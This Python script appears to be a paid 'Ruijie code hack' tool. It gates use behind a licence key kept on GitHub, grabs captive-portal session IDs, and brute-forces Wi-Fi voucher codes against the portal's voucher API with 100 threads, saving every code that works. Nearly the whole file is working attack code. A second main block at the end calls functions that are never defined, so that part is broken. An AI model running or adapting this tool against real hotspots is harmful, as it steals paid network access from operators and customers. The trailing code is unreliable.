import requests
import os
import hashlib
import subprocess
import json
import time
import urllib3
from datetime import datetime
import sys
import random
import string
import threading
import re
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =========================
# LICENSE CONFIG
# =========================
GITHUB_URL = "https://raw.githubusercontent.com/paingkhant2701199/Starlink_code/main/key.txt"
ID_STORAGE = ".device_id"
LICENSE_FILE = ".leo_vip.lic"

# =========================
# COLORS (License Part)
# =========================
R = "\033[1;31m"
G = "\033[1;32m"
C = "\033[1;36m"
Y = "\033[1;33m"
M = "\033[1;35m"
RESET = "\033[0m"

# =========================
# SCANNER COLORS
# =========================
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'

# =========================
# SCANNER CONFIGURATION
# =========================
NUM_THREADS = 100
SESSION_POOL_SIZE = 50
PER_SESSION_MAX = 300
SAVE_PATH = os.path.join(os.path.expanduser("~"), "code.txt")
MAX_RETRIES = 3

# =========================
# SCANNER GLOBALS
# =========================
session_pool = Queue()
valid_codes = []
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None

TOTAL_TRIED = 0
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()
CODE_LENGTH = 6
CODE_TYPE = "letters"
scanner_running = True

# =========================
# LOADING EFFECT
# =========================
def loading(msg):
    print(C + msg, end="", flush=True)
    for _ in range(3):
        time.sleep(0.4)
        print(".", end="", flush=True)
    print(RESET)

# =========================
# LICENSE BANNER
# =========================
def banner():
    os.system("clear")
    print(f'''
{R}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{RESET}
{R}┃                                                ┃{RESET}
{R}┃{G}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ {R}┃{RESET}
{R}┃{G} ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ {R}┃{RESET}
{R}┃{G} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G} ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ {R}┃{RESET}
{R}┃{G} ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ {R}┃{RESET}
{R}┃{G}  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {R}┃{RESET}
{R}┃                                                ┃{RESET}
{R}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{RESET}

{M}        >>> LEO VIP SYSTEM <<<{RESET}
{C}        Developer : @paing07709{RESET}
''')

# =========================
# DEVICE ID
# =========================
def get_device_id():
    if os.path.exists(ID_STORAGE):
        return open(ID_STORAGE).read().strip()

    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown":
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()

        if not serial:
            import uuid
            serial = str(uuid.getnode())

        raw = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        hwid = f"LEO-{raw}"

    except:
        hwid = f"LEO-{hashlib.md5(os.urandom(16)).hexdigest()[:10].upper()}"

    open(ID_STORAGE, "w").write(hwid)
    return hwid

# =========================
# LICENSE CHECK
# =========================
def check_license():
    banner()
    hwid = get_device_id()

    print(C + f"[DEVICE] => {hwid}" + RESET)
    print(Y + "-"*40 + RESET)

    if os.path.exists(LICENSE_FILE):
        try:
            data = json.load(open(LICENSE_FILE))
            if data["id"] == hwid:
                expiry = datetime.strptime(data["expiry"], "%d-%m-%Y")
                if datetime.now() < expiry:
                    print(G + "[✓] AUTO LOGIN SUCCESS" + RESET)
                    print(C + f"[EXPIRY] => {data['expiry']}" + RESET)
                    time.sleep(1)
                    return True
        except:
            pass

    key = input(Y + "[ENTER KEY] >>> " + RESET)
    loading("[+] Connecting to server")

    try:
        res = requests.get(GITHUB_URL, timeout=10, verify=False).text
        lines = res.splitlines()

        for line in lines:
            if "|" in line:
                db_id, db_key, db_date = line.split("|")

                if db_id.strip() == hwid and db_key.strip() == key:
                    expiry = datetime.strptime(db_date.strip(), "%d-%m-%Y")

                    if datetime.now() < expiry:
                        json.dump({
                            "id": hwid,
                            "key": key,
                            "expiry": db_date.strip()
                        }, open(LICENSE_FILE, "w"))

                        print(G + "\n[✓] ACCESS GRANTED" + RESET)
                        print(C + f"[EXPIRY] => {db_date}" + RESET)
                        time.sleep(2)
                        return True
                    else:
                        print(R + "[!] KEY EXPIRED" + RESET)
                        return False

        print(R + "[!] INVALID KEY / DEVICE" + RESET)
        return False

    except:
        print(R + "[!] NETWORK ERROR" + RESET)
        return False

# =========================
# SCANNER FUNCTIONS
# =========================
def get_code_config():
    global CODE_LENGTH, CODE_TYPE
    
    print(f"{CYAN}{BOLD}")
    print("╔══════════════════════════════════════════════════════════╗")
    print("║                 Leo Ruijie code Hack Vip -- Dev By @Paing07709                             ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"{RESET}")
    
    print(f"{YELLOW}[?] Select code type:{RESET}")
    print(f"{GREEN}    1. Numbers only (0-9){RESET}")
    print(f"{GREEN}    2. Letters only (a-z){RESET}")
    print(f"{GREEN}    3. Letters + Numbers (a-z0-9){RESET}")
    
    while True:
        choice = input(f"\n{CYAN}[>] Enter choice (1-3) or press Enter for Letters only: {RESET}").strip()
        
        if choice == "" or choice == "2":
            CODE_TYPE = "letters"
            print(f"{GREEN}[✓] Using: Letters only (a-z){RESET}")
            break
        elif choice == "1":
            CODE_TYPE = "digits"
            print(f"{GREEN}[✓] Using: Numbers only (0-9){RESET}")
            break
        elif choice == "3":
            CODE_TYPE = "alphanum"
            print(f"{GREEN}[✓] Using: Letters + Numbers (a-z0-9){RESET}")
            break
        else:
            print(f"{RED}[✗] Invalid choice! Please enter 1, 2, or 3{RESET}")
    
    len_input = input(f"\n{GREEN}[?] Enter code length (press Enter for 6): {RESET}").strip()
    
    if len_input == "":
        CODE_LENGTH = 6
        print(f"{YELLOW}[!] Using default: {CODE_LENGTH} characters{RESET}")
    else:
        try:
            CODE_LENGTH = int(len_input)
            if CODE_LENGTH < 1 or CODE_LENGTH > 10:
                print(f"{RED}[!] Invalid! Using 6{RESET}")
                CODE_LENGTH = 6
            else:
                print(f"{GREEN}[✓] Code length: {CODE_LENGTH}{RESET}")
        except:
            print(f"{RED}[!] Invalid! Using 6{RESET}")
            CODE_LENGTH = 6
    
    if CODE_TYPE == "digits":
        total_combos = 10 ** CODE_LENGTH
        char_set = "0-9"
    elif CODE_TYPE == "letters":
        total_combos = 26 ** CODE_LENGTH
        char_set = "a-z"
    else:
        total_combos = 36 ** CODE_LENGTH
        char_set = "a-z0-9"
    
    print(f"{CYAN}[ℹ] Character set: {char_set}{RESET}")
    print(f"{CYAN}[ℹ] Total possible codes: {total_combos:,}{RESET}")
    print(f"{CYAN}[+] Starting random scan with {NUM_THREADS} threads...{RESET}")
    time.sleep(1)

def generate_random_code():
    global CODE_TYPE, CODE_LENGTH
    
    if CODE_TYPE == "digits":
        return ''.join(random.choices(string.digits, k=CODE_LENGTH))
    elif CODE_TYPE == "letters":
        return ''.join(random.choices(string.ascii_lowercase, k=CODE_LENGTH))
    else:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=CODE_LENGTH))

def get_sid_from_gateway():
    global DETECTED_BASE_URL
    
    for attempt in range(MAX_RETRIES):
        try:
            s = requests.Session()
            test_url = "http://connectivitycheck.gstatic.com/generate_204"
            r1 = s.get(test_url, allow_redirects=True, timeout=5)
            
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
            
            if path_match:
                r2 = s.get(final_url, timeout=5)
                final_url = r2.url
                html_content = r1.text + r2.text
            else:
                html_content = r1.text

            parsed = urlparse(final_url)
            DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
            
            sid = parse_qs(parsed.query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', html_content)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                return sid
                
        except Exception as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(1)
            continue
    
    return None

def session_refiller():
    while scanner_running:
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid:
                    session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(0.3)
        except:
            time.sleep(1)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE, scanner_running
    
    thr_session = requests.Session()
    headers = {
        'Content-Type': 'application/json',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android)'
    }
    
    while scanner_running:
        try:
            if not DETECTED_BASE_URL:
                time.sleep(0.5)
                continue
            
            try:
                slot = session_pool.get(timeout=1)
            except Empty:
                continue
            
            code = generate_random_code()
            CURRENT_CODE = code
            
            target_api = f"{DETECTED_BASE_URL}/api/auth/voucher/"
            
            try:
                r = thr_session.post(target_api,
                                    json={'accessCode': code, 'sessionId': slot['sessionId'], 'apiVersion': 1},
                                    headers=headers,
                                    timeout=5)
                
                TOTAL_TRIED += 1
                res_text = r.text.lower()
                
                if "true" in res_text or '"success":true' in res_text:
                    with valid_lock:
                        if code not in valid_codes:
                            valid_codes.append(code)
                            TOTAL_HITS += 1
                            save_valid_code(code, slot['sessionId'])
                            print(f"{GREEN}[✓] VALID CODE FOUND: {code} | Total: {TOTAL_HITS}{RESET}")
                
                is_bad = any(m in res_text for m in ["expired", "invalid", "timeout"])
                if not is_bad and r.status_code not in (401, 403, 429):
                    slot['left'] -= 1
                    if slot['left'] > 0:
                        session_pool.put(slot)
                        
            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass
                
        except Exception:
            pass

def save_valid_code(code, sid):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        
        with file_lock:
            with open(SAVE_PATH, "a") as f:
                f.write(f"{ts} | {code}\n")
    except:
        pass

def live_dashboard():
    global scanner_running
    
    while scanner_running:
        os.system('clear' if os.name == 'posix' else 'cls')
        elapsed = time.time() - START_TIME
        speed = TOTAL_TRIED / elapsed if elapsed > 0 else 0
        
        if CODE_TYPE == "digits":
            mode_text = "NUMBERS MODE (0-9)"
            char_set = "0-9"
        elif CODE_TYPE == "letters":
            mode_text = "ALPHABET MODE (a-z)"
            char_set = "a-z"
        else:
            mode_text = "ALPHANUM MODE (a-z0-9)"
            char_set = "a-z0-9"
        
        print(f"{CYAN}{BOLD}")
        print("╔══════════════════════════════════════════════════════════╗")
        print("║     ██████╗ ██╗   ██╗██████╗ ███████╗██████╗             ║")
        print("║     ██╔══██╗██║   ██║██╔══██╗██╔════╝██╔══██╗            ║")
        print("║     ██████╔╝██║   ██║██████╔╝█████╗  ██████╔╝            ║")
        print("║     ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██╔══██╗            ║")
        print("║     ██║  ██║╚██████╔╝██║  ██║███████╗██║  ██║            ║")
        print("║     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝            ║")
        print(f"║          {mode_text:^42} ║") 
        print("╚══════════════════════════════════════════════════════════╝")
        print(f"{RESET}")
        
        print(f"{YELLOW}[{datetime.now().strftime('%H:%M:%S')}] ⚡ STATUS{RESET}")
        print(f"{GREEN}  ➜ CODE TYPE   : {char_set}{RESET}")
        print(f"{GREEN}  ➜ CODE LENGTH : {CODE_LENGTH} characters{RESET}")
        print(f"{GREEN}  ➜ BASE URL    : {DETECTED_BASE_URL or 'DETECTING...'}{RESET}")
        print(f"{GREEN}  ➜ THREADS     : {NUM_THREADS} active{RESET}")
        print(f"{GREEN}  ➜ SESSION POOL: {session_pool.qsize()} / {SESSION_POOL_SIZE}{RESET}")
        
        print(f"{MAGENTA}  ──────────────────────────────────────────{RESET}")
        
        print(f"{CYAN}  ✦ TOTAL TRIED  : {TOTAL_TRIED:,}{RESET}")
        print(f"{CYAN}  ✦ VALID HITS   : {TOTAL_HITS}{RESET}")
        print(f"{CYAN}  ✦ SPEED        : {speed:.1f} codes/sec{RESET}")
        print(f"{CYAN}  ✦ LAST CODE    : {CURRENT_CODE}{RESET}")
        
        print(f"{MAGENTA}  ──────────────────────────────────────────{RESET}")
        print(f"{RED}{BOLD}  [⚡ VALID CODES FOUND ⚡]{RESET}")
        
        with valid_lock:
            if valid_codes:
                for c in valid_codes[-10:]:
                    print(f"{GREEN}    ✅ {c}{RESET}")
            else:
                print(f"{YELLOW}    ⏳ Waiting for valid codes...{RESET}")
        
        print(f"{MAGENTA}  ──────────────────────────────────────────{RESET}")
        print(f"{RED}{BOLD}  [PRESS CTRL+C TO STOP]{RESET}")
        
        time.sleep(0.5)

def start_scanner():
    global scanner_running, START_TIME
    
    get_code_config()
    
    print(f"{GREEN}[+] Initializing scanner...{RESET}")
    
    START_TIME = time.time()
    scanner_running = True
    
    threading.Thread(target=session_refiller, daemon=True).start()
    threading.Thread(target=live_dashboard, daemon=True).start()
    
    time.sleep(2)
    
    for i in range(NUM_THREADS):
        threading.Thread(target=worker_thread, daemon=True).start()
    
    print(f"{GREEN}[✓] Scanner running with {NUM_THREADS} threads!{RESET}\n")
    
    try:
        while scanner_running:
            time.sleep(1)
    except KeyboardInterrupt:
        scanner_running = False
        print(f"\n{RED}{BOLD}[!] Scanner stopped by user{RESET}")
        print(f"{YELLOW}[✓] Total codes tried: {TOTAL_TRIED:,}{RESET}")
        print(f"{YELLOW}[✓] Valid codes found: {TOTAL_HITS}{RESET}")
        print(f"{YELLOW}[✓] Saved to: {SAVE_PATH}{RESET}")

# =========================
# MAIN - RUN LICENSE THEN SCANNER
# =========================
if __name__ == "__main__":
    try:
        if check_license():
            banner()
            print(G + "[ SYSTEM ONLINE ]" + RESET)
            print(C + "[+] Loading CYBER EXTREME SCANNER..." + RESET)
            time.sleep(2)
            start_scanner()
    except KeyboardInterrupt:
        print(R + "\n[!] EXITED BY USER" + RESET)
        # ==============================
# MAIN LAUNCHER
# ==============================
def main():
    if verify_key():
        hacker_banner()
        print(f"{G}[+] Welcome Agent. System is online.")
        print(f"{C}[*] Initializing Main Modules...")
        time.sleep(1)
        run_scanner()
    else:
        sys.exit()

if __name__ == "__main__":
    main()